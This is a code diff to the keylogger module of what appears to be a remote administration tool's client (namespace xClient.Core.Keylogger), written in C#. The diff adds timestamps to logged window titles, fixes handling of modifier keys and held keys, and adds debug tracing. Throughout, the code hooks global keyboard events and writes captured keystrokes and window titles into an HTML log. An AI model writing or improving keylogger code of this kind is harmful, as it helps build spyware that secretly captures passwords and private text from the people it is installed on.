@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.Diagnostics;
 using System.IO;
 using System.Text;
 using System.Windows.Forms;
@@ -25,6 +26,7 @@ namespace xClient.Core.Keylogger
 
         private List<Keys> _pressedKeys = new List<Keys>();
         private List<char> _pressedKeyChars = new List<char>();
+        private bool _ignoreSpecialKeys = false;
 
         private IKeyboardMouseEvents _mEvents;
 
@@ -78,7 +80,7 @@ namespace xClient.Core.Keylogger
             _mEvents = events;
             _mEvents.KeyDown += OnKeyDown;
             _mEvents.KeyUp += OnKeyUp;
-            _mEvents.KeyPress += Logger_KeyPress;
+            _mEvents.KeyPress += OnKeyPress;
         }
 
         private void Unsubscribe()
@@ -87,7 +89,7 @@ namespace xClient.Core.Keylogger
 
             _mEvents.KeyDown -= OnKeyDown;
             _mEvents.KeyUp -= OnKeyUp;
-            _mEvents.KeyPress -= Logger_KeyPress;
+            _mEvents.KeyPress -= OnKeyPress;
             _mEvents.Dispose();
         }
 
@@ -97,50 +99,59 @@ namespace xClient.Core.Keylogger
             if (!string.IsNullOrEmpty(activeWindowTitle) && activeWindowTitle != _lastWindowTitle)
             {
                 _lastWindowTitle = activeWindowTitle;
-                _logFileBuffer.Append(@"<p class=""h""><br><br>[<b>" + activeWindowTitle + "</b>]</p><br>");
+                _logFileBuffer.Append(@"<p class=""h""><br><br>[<b>" 
+                    + activeWindowTitle + " - " 
+                    + DateTime.Now.ToString("HH:mm") 
+                    + "</b>]</p><br>");
             }
 
             if (_pressedKeys.IsModifierKeysSet())
             {
                 if (!_pressedKeys.Contains(e.KeyCode))
                 {
+                    Debug.WriteLine("OnKeyDown: " + e.KeyCode);
                     _pressedKeys.Add(e.KeyCode);
                     return;
                 }
             }
 
-            // The keys below are excluded. If it is one of the keys below,
-            // the KeyPress event will handle these characters. If the keys
-            // are not any of those specified below, we can continue.
-            if (e.KeyCode.IsExcludedKey())
+            if (!e.KeyCode.IsExcludedKey())
             {
                 // The key was not part of the keys that we wish to filter, so
                 // be sure to prevent a situation where multiple keys are pressed.
                 if (!_pressedKeys.Contains(e.KeyCode))
                 {
+                    Debug.WriteLine("OnKeyDown: " + e.KeyCode);
                     _pressedKeys.Add(e.KeyCode);
                 }
             }
         }
 
         //This method should be used to process all of our unicode characters
-        private void Logger_KeyPress(object sender, KeyPressEventArgs e) //Called second
+        private void OnKeyPress(object sender, KeyPressEventArgs e) //Called second
         {
-            if (_pressedKeys.IsModifierKeysSet())
+            if (_pressedKeys.IsModifierKeysSet() && _pressedKeys.ContainsKeyChar(e.KeyChar))
                 return;
 
-            if (!_pressedKeyChars.Contains(e.KeyChar) || !LoggerHelper.DetectKeyHolding(_pressedKeyChars, e.KeyChar))
+            if ((!_pressedKeyChars.Contains(e.KeyChar) || !LoggerHelper.DetectKeyHolding(_pressedKeyChars, e.KeyChar)) && !_pressedKeys.ContainsKeyChar(e.KeyChar))
             {
-                _pressedKeyChars.Add(e.KeyChar);
-                _logFileBuffer.Append(LoggerHelper.Filter(e.KeyChar));
+                var filtered = LoggerHelper.Filter(e.KeyChar);
+                if (!string.IsNullOrEmpty(filtered))
+                {
+                    Debug.WriteLine("OnKeyPress Output: " + filtered);
+                    if (_pressedKeys.IsModifierKeysSet())
+                        _ignoreSpecialKeys = true;
+
+                    _pressedKeyChars.Add(e.KeyChar);
+                    _logFileBuffer.Append(filtered);
+                }
             }
         }
 
         private void OnKeyUp(object sender, KeyEventArgs e) //Called third
         {
             _logFileBuffer.Append(HighlightSpecialKeys(_pressedKeys.ToArray()));
-            for (int i = 0; i < _pressedKeyChars.Count; i++)
-                _pressedKeyChars.RemoveAt(i);
+            _pressedKeyChars.Clear();
         }
 
         private string HighlightSpecialKeys(Keys[] keys)
@@ -150,8 +161,19 @@ namespace xClient.Core.Keylogger
             string[] names = new string[keys.Length];
             for (int i = 0; i < keys.Length; i++)
             {
-                names[i] = LoggerHelper.GetDisplayName(keys[i]);
+                if (!_ignoreSpecialKeys)
+                {
+                    names[i] = LoggerHelper.GetDisplayName(keys[i]);
+                    Debug.WriteLine("HighlightSpecialKeys: " + keys[i] + " : " + names[i]);
+                }
+                else
+                {
+                    names[i] = string.Empty;
+                    _pressedKeys.Remove(keys[i]);
+                }
             }
+
+            _ignoreSpecialKeys = false;
 
             if (_pressedKeys.IsModifierKeysSet())
             {
@@ -171,6 +193,7 @@ namespace xClient.Core.Keylogger
                 if (validSpecialKeys > 0)
                     specialKeys.Append("]</p>");
 
+                Debug.WriteLineIf(specialKeys.Length > 0, "HighlightSpecialKeys Output: " + specialKeys.ToString());
                 return specialKeys.ToString();
             }
 
@@ -195,6 +218,7 @@ namespace xClient.Core.Keylogger
                 }
             }
 
+            Debug.WriteLineIf(normalKeys.Length > 0, "HighlightSpecialKeys Output: " + normalKeys.ToString());
             return normalKeys.ToString();
         }
 
